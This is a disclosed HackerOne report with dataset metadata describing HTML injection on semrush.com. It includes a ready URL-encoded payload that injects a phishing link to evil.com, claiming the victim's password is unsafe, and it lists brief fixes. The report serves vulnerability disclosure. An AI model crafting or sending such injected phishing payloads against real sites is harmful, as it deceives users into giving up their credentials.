---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '723707'
original_report_id: '723707'
title: Code injection in https://www.semrush.com
weakness: Code Injection
team_handle: semrush
created_at: '2019-10-27T18:21:40.285Z'
disclosed_at: '2019-11-01T14:18:09.093Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
asset_identifier: '*.semrush.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# Code injection in https://www.semrush.com

## Metadata

- HackerOne Report ID: 723707
- Weakness: Code Injection
- Program: semrush
- Disclosed At: 2019-11-01T14:18:09.093Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

##INTRODUCES:
-With a direct error on the homepage, it is easy to trick the victim into accessing a fake page from the attacker

##STEP:
Step: Send url with payload to victim:
https://www.semrush.com/marketplace/%22%0D%0A/%3E%3Ch1%3E%3Ca%20href%3Dhttps://evil.com%3EYour%20password%20is%20currently%20unsafe,%20please%20click%20the%20link%20to%20update%20the%20information%3C/a%3E%3C/h1%3E/

==> Victim enter link and open redirect to evil.com , Attacker can phishing to Retrieve user information.

##FIX:
-Whitelist
-Filter "<"

## Impact

- Fake notification.
- Open redirect

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
